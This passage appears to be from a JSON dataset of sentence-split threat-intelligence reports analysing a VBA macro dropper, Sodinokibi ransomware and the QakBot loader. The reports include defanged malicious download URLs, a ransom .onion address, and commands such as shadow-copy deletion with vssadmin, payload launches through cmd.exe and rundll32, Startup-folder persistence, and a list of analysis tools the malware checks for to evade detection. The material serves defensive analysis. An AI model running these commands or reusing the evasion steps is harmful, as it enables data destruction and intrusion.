        "text": "This file path is calculated based on the current user\u2019s Temp folder location: <temp_dir_path>\\.\\lsm.exe\n",
        "type": "",
        "report": "r-416",
        "line": 5,
        "index": 1059
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S6",
        "text": "- Decodes the second stage binary in memory and writes it to the %temp%\\.\\lsm.exe file location\n",
        "type": "",
        "report": "r-416",
        "line": 6,
        "index": 1060
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S7",
        "text": "- After writing the second stage payload to disk the VBA code performs two important actions. \n",
        "type": "",
        "report": "r-416",
        "line": 7,
        "index": 1061
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S8",
        "text": "  ",
        "type": "",
        "report": "r-416",
        "line": 8,
        "index": 1062
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S9",
        "text": "- Runs the second stage payload using cmd.exe.",
        "type": "",
        "report": "r-416",
        "line": 9,
        "index": 1063
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S10",
        "text": "This is done so that the cmd.exe process exists as soon as the payload is launched.",
        "type": "",
        "report": "r-416",
        "line": 10,
        "index": 1064
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S11",
        "text": "This way a process enumeration tool cannot find the parent process => Smaller footprint.",
        "type": "",
        "report": "r-416",
        "line": 11,
        "index": 1065
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S12",
        "text": "cmdline for executing the second stage binary: cmd.exe /c start /b <temp_dir_path>\\.\\lsm.exe /haobao\n",
        "type": "",
        "report": "r-416",
        "line": 12,
        "index": 1066
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S13",
        "text": "  - Adds persistence on the system by creating a shortcut in the user\u2019s Startup folder with the correct cmdline arguments:\n",
        "type": "",
        "report": "r-416",
        "line": 13,
        "index": 1067
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S14",
        "text": "    - Link file command line: <temp_dir_path>\\.\\lsm.exe /haobao\n",
        "type": "",
        "report": "r-416",
        "line": 14,
        "index": 1068
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S15",
        "text": "    - Link File Name: GoogleUpdate.lnk\n",
        "type": "",
        "report": "r-416",
        "line": 15,
        "index": 1069
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S16",
        "text": "- Once the second stage payload has been launched, the VBA Macro proceeds to display a decoy document to the end user.",
        "type": "",
        "report": "r-416",
        "line": 16,
        "index": 1070
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S17",
        "text": "This decoy document is also stored in the VBA Macro as an encrypted string array (similar to the second stage payload).",
        "type": "",
        "report": "r-416",
        "line": 17,
        "index": 1071
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S18",
        "text": "The decoy document is again written to the user\u2019s temp directory to the following filename/path: <temp_dir_path>\\.\\Job Description.doc\n",
        "type": "",
        "report": "r-416",
        "line": 18,
        "index": 1072
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S19",
        "text": "- Once the decoy document has been written to disk, the VBA Macro sets its file attributes to System + Hidden\n",
        "type": "",
        "report": "r-416",
        "line": 19,
        "index": 1073
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S20",
        "text": "- The decoy document is then opened by the malicious VBA Macro and the original malicious document\u2019s caption is copied over to the decoy document to trick the end user into mistaking the decoy document for the original (malicious) document.\n",
        "type": "",
        "report": "r-416",
        "line": 20,
        "index": 1074
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S21",
        "text": "- This activity, combined with the fact that the VBA Macro then closes the current (malicious) document, indicates that the VBA Macro aims to trick an unsuspecting user into thinking that the decoy document currently open is the original (malicious) document opened by the user.",
        "type": "",
        "report": "r-416",
        "line": 21,
        "index": 1075
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S22",
        "text": "- Since the decoy document is a benign file and does not contain any macros the victim does not suspect any malicious behavior.\n",
        "type": "",
        "report": "r-416",
        "line": 22,
        "index": 1076
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S23",
        "text": "As part of the implant initialization activities the implant does the following;\n",
        "type": "",
        "report": "r-416",
        "line": 23,
        "index": 1077
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S24",
        "text": "- Checks the string passed to it through command line \n",
        "type": "",
        "report": "r-416",
        "line": 24,
        "index": 1078
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S25",
        "text": "If the malware does not find this string in its cmdline arguments, it simply quits without going any further.\n",
        "type": "",
        "report": "r-416",
        "line": 25,
        "index": 1079
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S26",
        "text": "- Unwraps a DLL into memory and calls its one-and-only import using Reflective DLL injection.",
        "type": "",
        "report": "r-416",
        "line": 26,
        "index": 1080
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S27",
        "text": "DLL information.",
        "type": "",
        "report": "r-416",
        "line": 27,
        "index": 1081
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S28",
        "text": "During our research, we discovered additional variants of the DLL file.\n",
        "type": "",
        "report": "r-416",
        "line": 28,
        "index": 1082
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S29",
        "text": "- As part of Reflective DLL loading the malware performs the following tasks on the DLL it has unwrapped in memory: \n",
        "type": "",
        "report": "r-416",
        "line": 29,
        "index": 1083
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S30",
        "text": "  - Copy the unwrapped DLL into new locations in its own memory space. \n",
        "type": "",
        "report": "r-416",
        "line": 30,
        "index": 1084
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S31",
        "text": "  - Build imports required by the DLL (based on the IAT of the DLL)\n",
        "type": "",
        "report": "r-416",
        "line": 31,
        "index": 1085
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S32",
        "text": "- Call the newly loaded DLL image\u2019s Entry Point (DllMain) with DLL_PROCESS_ATTACH to complete successful loading of the DLL in the malware process.\n",
        "type": "",
        "report": "r-416",
        "line": 32,
        "index": 1086
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S33",
        "text": "- Call the actual malicious export in the DLL named \u201cCoreDn\u201d\n",
        "type": "",
        "report": "r-416",
        "line": 33,
        "index": 1087
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S34",
        "text": "All the malicious activities described below are performed by the DLL unless specified otherwise.\n",
        "type": "",
        "report": "r-416",
        "line": 34,
        "index": 1088
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S35",
        "text": "The implant has the capability of gathering data from the victim\u2019s system.",
        "type": "",
        "report": "r-416",
        "line": 35,
        "index": 1089
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S36",
        "text": "The following information will be gathered and sent to the command and control server.\n",
        "type": "",
        "report": "r-416",
        "line": 36,
        "index": 1090
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S37",
        "text": "- Computer name and currently logged on user\u2019s name, stored in the format <ComputerName> \\ <Username>\n",
        "type": "",
        "report": "r-416",
        "line": 37,
        "index": 1091
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S38",
        "text": "- List of all processes currently running on the system arranged in format <Process Name>\\r\n",
        "type": "",
        "report": "r-416",
        "line": 38,
        "index": 1092
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S39",
        "text": "- The presence of a specific registry key on the system HKEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt\n",
        "type": "",
        "report": "r-416",
        "line": 39,
        "index": 1093
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S40",
        "text": "- The malware appends an indicator (flag) specifying whether the above registry key was found in the user\u2019s registry:\n",
        "type": "",
        "report": "r-416",
        "line": 40,
        "index": 1094
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S41",
        "text": "This key is checked again as part of the command and control communication and is sent as a duplicate value to the command and control in the HTTP POST request as well (explained in the below).\n",
        "type": "",
        "report": "r-416",
        "line": 41,
        "index": 1095
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S42",
        "text": "In preparation of the exfiltration of information collected from the endpoint, the malware performs the following activities:\n",
        "type": "",
        "report": "r-416",
        "line": 42,
        "index": 1096
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S43",
        "text": "Encode the collected information using a simple byte based XOR operation using the byte key: 0x34.\n",
        "type": "",
        "report": "r-416",
        "line": 43,
        "index": 1097
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S44",
        "text": "Base64 encode (standard) the XORed data.",
        "type": "",
        "report": "r-416",
        "line": 44,
        "index": 1098
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S45",
        "text": "Again, check for the presence of the Registry Key: HKCU\\Software\\Bitcoin\\Bitcoin-Qt\n",
        "type": "",
        "report": "r-416",
        "line": 45,
        "index": 1099
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S46",
        "text": "Once the malware has performed all these activities it sends an HTTP POST request to the CnC server:\n",
        "type": "",
        "report": "r-416",
        "line": 46,
        "index": 1100
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S47",
        "text": "The persistence mechanism of the malware is performed only for the downloaded implant.",
        "type": "",
        "report": "r-416",
        "line": 47,
        "index": 1101
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S48",
        "text": "Persistence is established for the implant via the visual basic macro code initially executed upon document loading by the victim.",
        "type": "",
        "report": "r-416",
        "line": 48,
        "index": 1102
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S49",
        "text": "This persistence is also performed ONLY if the malware successfully executes the downloaded implant.",
        "type": "",
        "report": "r-416",
        "line": 49,
        "index": 1103
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S50",
        "text": "The malware first tries to update the HKEY_LOCAL_MACHINE registry key.\n",
        "type": "",
        "report": "r-416",
        "line": 50,
        "index": 1104
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S51",
        "text": "If the update is unsuccessful then it also tries to update the HKEY_CURRENT_USER registry key.",
        "type": "",
        "report": "r-416",
        "line": 51,
        "index": 1105
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S52",
        "text": "Value written to registry to achieve persistence on the endpoint:\n",
        "type": "",
        "report": "r-416",
        "line": 52,
        "index": 1106
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S0",
        "text": "Spearphishing Attachment (ATT&CK T1193) is one of the most used Initial Access techniques used by ransomware families as in Sodinokibi.",
        "type": "",
        "report": "r-418",
        "line": 0,
        "index": 1107
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S1",
        "text": "Attackers use spam emails with an attached MS Office Word document including a malicious macro to download the ransomware to the target system.",
        "type": "",
        "report": "r-418",
        "line": 1,
        "index": 1108
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S2",
        "text": "In order to show the lifecycle of Sodinokibi ransomware, we analyzed a Microsoft Word document.",
        "type": "",
        "report": "r-418",
        "line": 2,
        "index": 1109
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S3",
        "text": "The specific sample analyzed below is Bewerbungsunterlagen_6704760.doc ( SHA-256: fb8b03748b617acf0ee3b138c5b37e74ec396bc73da3362d633862d7283742fd , detection rate is only 33/60 as of today).",
        "type": "",
        "report": "r-418",
        "line": 3,
        "index": 1110
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S4",
        "text": "Even though Sodinokibi uses simple obfuscation techniques mentioned below, 30 of 60 antiviruses cannot detect it.",
        "type": "",
        "report": "r-418",
        "line": 4,
        "index": 1111
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S5",
        "text": "\u201cBewerbungsunterlagen\u201d means \u201capplication document\u201d in German, and the attackers used a CV theme to lure victims into downloading the document.",
        "type": "",
        "report": "r-418",
        "line": 5,
        "index": 1112
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S6",
        "text": "Sodinokibi is a \u201cRansomware-as-a-Service (RAAS) malware, so its distribution methods vary depending on the attacker distributing it.",
        "type": "",
        "report": "r-418",
        "line": 6,
        "index": 1113
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S7",
        "text": "Attackers have used the following Initial Access techniques in their other campaigns to deliver Sodinokibi:\n",
        "type": "",
        "report": "r-418",
        "line": 7,
        "index": 1114
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S8",
        "text": "Exploit Public-Facing Application (ATT&CK T1190)",
        "type": "",
        "report": "r-418",
        "line": 8,
        "index": 1115
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S9",
        "text": ": Attackers exploit vulnerabilities in enterprise applications to distribute it, such as the deserialization vulnerability CVE-2019-2725 in Oracle WebLogic Server having a CVSS score of 9.8/10.\n",
        "type": "",
        "report": "r-418",
        "line": 9,
        "index": 1116
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S10",
        "text": "Remote Desktop Protocol ( ATT&CK T1076) : Attackers use RDP to deliver Sodinokibi.",
        "type": "",
        "report": "r-418",
        "line": 10,
        "index": 1117
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S11",
        "text": "This delivery technique can also be classified in External Remote Services ( ATT&CK T1133).",
        "type": "",
        "report": "r-418",
        "line": 11,
        "index": 1118
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S12",
        "text": "Supply Chain Compromise ( ATT&CK T1195) : Sodinokibi ransomware was distributed through a compromised version of WinRAR downloaded from the WinRAR Italia website.",
        "type": "",
        "report": "r-418",
        "line": 12,
        "index": 1119
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S13",
        "text": "Drive-by-Compromise ( ATT&CK T1189): Attackers compromised WordPress sites and injected JavaScript over the content of the original site to spread Sodinokibi.\n",
        "type": "",
        "report": "r-418",
        "line": 13,
        "index": 1120
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S14",
        "text": "When a victim opens the document, Microsoft Word asks to enable/disable macros.",
        "type": "",
        "report": "r-418",
        "line": 14,
        "index": 1121
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S15",
        "text": "It reveals that a macro is embedded in the document (Scripting, ATT&CK T1054).\n",
        "type": "",
        "report": "r-418",
        "line": 15,
        "index": 1122
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S16",
        "text": "The malicious document claims that it was created in an earlier version of Microsoft Office and asks the victim to enable the content, which launches the code hidden in the macros.",
        "type": "",
        "report": "r-418",
        "line": 16,
        "index": 1123
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S17",
        "text": "When we examined macros in the document, we saw that VBA (Visual Basic for Applications) codes were split into modules and functions for the purpose of obfuscation (Obfuscate\n",
        "type": "",
        "report": "r-418",
        "line": 17,
        "index": 1124
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S18",
        "text": "According to the above functions, fU1 = \"hxxp://54.39.233.132/de1.trp\".",
        "type": "",
        "report": "r-418",
        "line": 18,
        "index": 1125
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S19",
        "text": "As we know the fU1 and fP1 parameters, we can understand the following function:\n",
        "type": "",
        "report": "r-418",
        "line": 19,
        "index": 1126
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S20",
        "text": "The second parameter (fU1) is a string value that contains the URL to download, and the third parameter (fP1) is a string value containing the name or full path of the file to create for the download.",
        "type": "",
        "report": "r-418",
        "line": 20,
        "index": 1127
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S21",
        "text": "Accordingly, this function downloads de1.trp from 54.39.233.132 and saves it to the C:\\Windows\\Temp\\ directory as MicrosoftOfficeWord_upd.v.88735.34.5.exe.\n",
        "type": "",
        "report": "r-418",
        "line": 21,
        "index": 1128
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S22",
        "text": "The downloaded file is the Sodinokibi ransomware (SHA-256: 720fbe60f049848f02ba9b2b91926f80ba65b84f0d831a55f4e634c820bd0848, detection rate is 51/69 as of today).",
        "type": "",
        "report": "r-418",
        "line": 22,
        "index": 1129
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S23",
        "text": "Its artifacts usually mimic the names of known executables for Defense Evasion, such as a Microsoft Word update file name (MicrosoftOfficeWord_upd.v.88735.34.5.exe) as in this sample (Masquerading, ATT&CK T1036).",
        "type": "",
        "report": "r-418",
        "line": 23,
        "index": 1130
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S24",
        "text": "As seen in the above process graph, the macro in the Word document downloads and runs Sodinokibi executable.",
        "type": "",
        "report": "r-418",
        "line": 24,
        "index": 1131
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S25",
        "text": "After execution, it runs the following command using cmd.exe (Command-Line Interface, ATT&CK T1059):\n",
        "type": "",
        "report": "r-418",
        "line": 25,
        "index": 1132
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S26",
        "text": "At first, this command runs vssadmin.exe to delete all volume shadow copies on the system to prevent recovery (Inhibit System Recovery, ATT&CK T1490) vssadmin.exe Delete Shadows /All /Quiet to delete all volume shadow copies on the system to prevent recovery (Inhibit System Recovery, ATT&CK T1490) Then, it uses bcdedit.exe twice to disable automatic Windows recovery features by modifying boot configuration data (Inhibit System Recovery, ATT&CK T1490) \n",
        "type": "",
        "report": "r-418",
        "line": 26,
        "index": 1133
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S27",
        "text": "Sigma rules detecting the above actions are given in the Appendix.\n",
        "type": "",
        "report": "r-418",
        "line": 27,
        "index": 1134
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S28",
        "text": "Like most ransomware, Sodinokibi encrypts files and adds a random extension such as \u201ctest.jpg.1cd8t9ahd5\u201d (Data Encrypted for Impact, ATT&CK T1486).",
        "type": "",
        "report": "r-418",
        "line": 28,
        "index": 1135
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S29",
        "text": "It also drops a ransom note in folders that contain encrypted files.",
        "type": "",
        "report": "r-418",
        "line": 29,
        "index": 1136
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S30",
        "text": "The name of the ransom note is the random extension added to the encrypted files.",
        "type": "",
        "report": "r-418",
        "line": 30,
        "index": 1137
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S31",
        "text": "For example, if the extension is \".1cd8t9ahd5\", the ransom message filename will be called \"1cd8t9ahd5-HOW-TO-DECRYPT.txt\".\n",
        "type": "",
        "report": "r-418",
        "line": 31,
        "index": 1138
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S32",
        "text": "The ransom note recommends accessing the attacker\u2019s website over the TOR browser: hxxp://aplebzu47wgazapdqks6vrcv6zcnjppkbxbr6wketf56nf6aq2nmyoyd.onion/C2D97495C4BA3647\n",
        "type": "",
        "report": "r-418",
        "line": 32,
        "index": 1139
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S33",
        "text": "When we accessed the website, we saw the following page that wants 0,6346 Bitcoin worth $5,000.",
        "type": "",
        "report": "r-418",
        "line": 33,
        "index": 1140
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S34",
        "text": "If you pay the ransom in two days, the cost is halving.",
        "type": "",
        "report": "r-418",
        "line": 34,
        "index": 1141
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S35",
        "text": "In the \u201cABOUT US\u201d section on their website, they claim that they developed the best data encryption and decryption system available today.",
        "type": "",
        "report": "r-418",
        "line": 35,
        "index": 1142
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S36",
        "text": "I am sure they did not develop the best encryption method, but they use multiple encryption by encrypting files and also the private keys.",
        "type": "",
        "report": "r-418",
        "line": 36,
        "index": 1143
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S37",
        "text": "To put it another way, it requires two keys for decryption.",
        "type": "",
        "report": "r-418",
        "line": 37,
        "index": 1144
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S38",
        "text": "Sodinokibi uses AES encryption to encrypt the private keys, and Salsa20 for encrypting files.",
        "type": "",
        "report": "r-418",
        "line": 38,
        "index": 1145
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S39",
        "text": "As far as I know, unfortunately there are no decryption tools to restore data encrypted by Sodinokibi ransomware.",
        "type": "",
        "report": "r-418",
        "line": 39,
        "index": 1146
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S0",
        "text": "Qakbot, also known as QBot or Pinkslipbot, is a modular information stealer.",
        "type": "",
        "report": "r-429",
        "line": 0,
        "index": 1147
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S1",
        "text": "It has been active since 2007 and primarily used by financially motivated actors.",
        "type": "",
        "report": "r-429",
        "line": 1,
        "index": 1148
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S2",
        "text": "It was initially known as a banking Trojan and a loader using C2 servers for payload delivery; however, its use expanded beyond strictly being a banking trojan.",
        "type": "",
        "report": "r-429",
        "line": 2,
        "index": 1149
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S3",
        "text": "The hallmarks of a QakBot infection chain consist of a phishing lure (T1566) delivered via email chain hijacking or spoofed emails that contain context-aware information such as shipping, work orders, urgent requests, invoices, claims, etc.",
        "type": "",
        "report": "r-429",
        "line": 3,
        "index": 1150
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S4",
        "text": "The phishing emails alternate between file attachments (T1566.001) and links (T1566.002).",
        "type": "",
        "report": "r-429",
        "line": 4,
        "index": 1151
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S5",
        "text": "QakBot is often used as a gateway entry, similar to TrickBot or Emotet, that leads to post exploitation operations leveraging frameworks such as Cobalt Strike as well as delivering Ransomware.",
        "type": "",
        "report": "r-429",
        "line": 5,
        "index": 1152
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S6",
        "text": "QakBot email lures are not the most sophisticated; however, by using contextually aware themes that originate from hijacked email chains or potentially compromised accounts within a user\u2019s social circle, they are effective.",
        "type": "",
        "report": "r-429",
        "line": 6,
        "index": 1153
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S7",
        "text": "Figure 1 below illustrates an example of a recent QakBot lure with the subject \u201cRe: SIGNED QUOTE\u201d and a ZIP file attachment labeled \u201cCancellation_Letter_272020508-02242021.zip\u201d.",
        "type": "",
        "report": "r-429",
        "line": 7,
        "index": 1154
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S8",
        "text": "The actors further establish the trust and confidence of the targeted user by presenting a semi-official looking DocuSign graphic that guides the user through the process of enabling the Excel 4 Macros.",
        "type": "",
        "report": "r-429",
        "line": 8,
        "index": 1155
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S9",
        "text": "A representative sample, 78ea3550e2697cd06b07df568242f7fc9f57e4d2b297b74f6ce26e97613de53a, seen in a recent QakBot campaign is shown in Figure 2 below.",
        "type": "",
        "report": "r-429",
        "line": 9,
        "index": 1156
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S10",
        "text": "QakBot Excel spreadsheets often contain hidden spreadsheets, Excel 4.0 macros, spreadsheet formulas, and BIFF records all designed to pass a visual inspection from the user with the added benefit of bypassing detection mechanisms that attempt to parse multiple legacy formats inside the spreadsheet.",
        "type": "",
        "report": "r-429",
        "line": 10,
        "index": 1157
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S11",
        "text": "Figure 3 below shows a screenshot of output from the open-source XLMMacroDeobfuscator tool, which decodes obfuscated Excel 4.0 macros.",
        "type": "",
        "report": "r-429",
        "line": 11,
        "index": 1158
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S12",
        "text": "Once the Excel 4.0 macro is decoded it is possible to see the CALL to URLDownloadToFileA, which downloads the QakBot DLL in this campaign from http[:]//rlyrt26rnxw02vqijgs[.]com/fera/frid[.]gif.",
        "type": "",
        "report": "r-429",
        "line": 12,
        "index": 1159
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S13",
        "text": "Next, the EXEC function is evaluated which executes \u201crundll32.exe nxckew.wle, DllRegisterServer\u201d.",
        "type": "",
        "report": "r-429",
        "line": 13,
        "index": 1160
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S14",
        "text": "It is also a common tactic for QakBot to execute \u201cregsvr32.exe -s nxckew.wle,DllRegisterServer\u201d.",
        "type": "",
        "report": "r-429",
        "line": 14,
        "index": 1161
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S15",
        "text": "Both instances are designed to evade sandbox environments that do not supply the expected command line arguments.",
        "type": "",
        "report": "r-429",
        "line": 15,
        "index": 1162
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S16",
        "text": "A representative QakBot DLL analyzed by Alien Labs, 9a353d4b85b3097762282703f1807c2b459698966b967280c8e4e13cc56d2e28, has two exports: the entry point (0x10005a5d) and DllRegisterServer (0x10029c88)and if DllRegisterServer is not called via regsvr32.exe or rundll32.exe with command line options, then only the entry point is called and the malicious code in DllRegisterServer is not called.",
        "type": "",
        "report": "r-429",
        "line": 16,
        "index": 1163
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S17",
        "text": "Figure 3 below shows improved readability and de-obfuscation of the macro by manually replacing and substituting the cell values and formulas.",
        "type": "",
        "report": "r-429",
        "line": 17,
        "index": 1164
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S18",
        "text": "The results of our additional de-obfuscation efforts are confirmed when the QakBot Excel spreadsheet is run inside a sandbox in Figure 4 below.",
        "type": "",
        "report": "r-429",
        "line": 18,
        "index": 1165
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S19",
        "text": "xckew.wle, DllRegisterServer'' execution\n",
        "type": "",
        "report": "r-429",
        "line": 19,
        "index": 1166
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S20",
        "text": "Before executing the main payload, the QakBot loader will first test the infected system to see if it is a good candidate for infection.",
        "type": "",
        "report": "r-429",
        "line": 20,
        "index": 1167
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S21",
        "text": "The QakBot loader is responsible for checking its environment to include whether it is running on a Virtual Machine, identifying any installed and running security and monitoring tools such as AntiVirus products or common security researcher tools.",
        "type": "",
        "report": "r-429",
        "line": 21,
        "index": 1168
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S22",
        "text": "Figure 5 below shows a high-level execution flow of the QakBot loader.",
        "type": "",
        "report": "r-429",
        "line": 22,
        "index": 1169
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S23",
        "text": "To make detection and analysis harder, QakBot encrypts its strings and decrypts them at runtime before use.",
        "type": "",
        "report": "r-429",
        "line": 23,
        "index": 1170
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S24",
        "text": "Once the QakBot execution logic is finished using a string, it will immediately delete the string from memory.",
        "type": "",
        "report": "r-429",
        "line": 24,
        "index": 1171
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S25",
        "text": "An example of this can be seen in Figure 6 below, which shows QakBot decrypting a string containing the value for lpProcName passed as a parameter to the GetProcAddress API call.",
        "type": "",
        "report": "r-429",
        "line": 25,
        "index": 1172
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S26",
        "text": "The selected function, which has been labeled in IDA Pro as, \u201coc_clear_mem\u201d deletes the string memory right after it retrieves the process address.",
        "type": "",
        "report": "r-429",
        "line": 26,
        "index": 1173
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S27",
        "text": "When executed, QakBot will check whether it has previously been executed on the machine by checking for the specified malware folder.",
        "type": "",
        "report": "r-429",
        "line": 27,
        "index": 1174
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S28",
        "text": "If QakBot discovers it is a first time run, it will relaunch itself from cmd.exe with the /C parameter that will inform the loader to proceed and run its Anti-VM checks on the machine and return the results to the parent process.",
        "type": "",
        "report": "r-429",
        "line": 28,
        "index": 1175
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S29",
        "text": "If QakBot detects it is running in a VM environment, then the final payload will not be decrypted since QakBot uses the return value from these checks in its final decryption routine.",
        "type": "",
        "report": "r-429",
        "line": 29,
        "index": 1176
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S30",
        "text": "Figure 7 below shows the QakBot environment check logic.",
        "type": "",
        "report": "r-429",
        "line": 30,
        "index": 1177
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S31",
        "text": "Specifically, QakBot checks the system for the names of running processes that match the strings listed in Table 1 below.",
        "type": "",
        "report": "r-429",
        "line": 31,
        "index": 1178
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S32",
        "text": "PROCESS NAMES Autoruns.exe bds-vision-agent-app.exe bds-vision-agent-nai.exe bds-vision-apis.exe CFF Explorer.exe dsniff.exe dumpcap.exe Fiddler.exe HashMyFiles.exe idaq.exe idaq64.exe lordpe.exe MultiAnalysis_v1.0.294.exe netmon.exe OLLYDBG.EXE pr0c3xp.exe ProcessHacker.exe Procmon.exe Procmon64.exe regshot.exe",
        "type": "",
        "report": "r-429",
        "line": 32,
        "index": 1179
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S33",
        "text": "ResourceHacker.exe runsample.exe samp1e.exe sample.exe",
        "type": "",
        "report": "r-429",
        "line": 33,
        "index": 1180
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S34",
        "text": "Tcpview.exe TPAutoConnect.exe",
        "type": "",
        "report": "r-429",
        "line": 34,
        "index": 1181
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S35",
        "text": "VBoxService.exe VBoxTray.exe VGAuthService.exe vm3dservice.exe vmacthlp.exe",
        "type": "",
        "report": "r-429",
        "line": 35,
        "index": 1182
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S36",
        "text": "vmtoolsd.exe windbg.exe",
        "type": "",
        "report": "r-429",
        "line": 36,
        "index": 1183
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S37",
        "text": "Wireshark.exe x32dbg.exe x64dbg.exe\n",
        "type": "",
        "report": "r-429",
        "line": 37,
        "index": 1184
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S38",
        "text": "QakBot will also add its folder to the Windows Defender exclusions setting located in the Registry (T1112), which prevents Defender from scanning QakBot artifacts.",
        "type": "",
        "report": "r-429",
        "line": 38,
        "index": 1185
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S39",
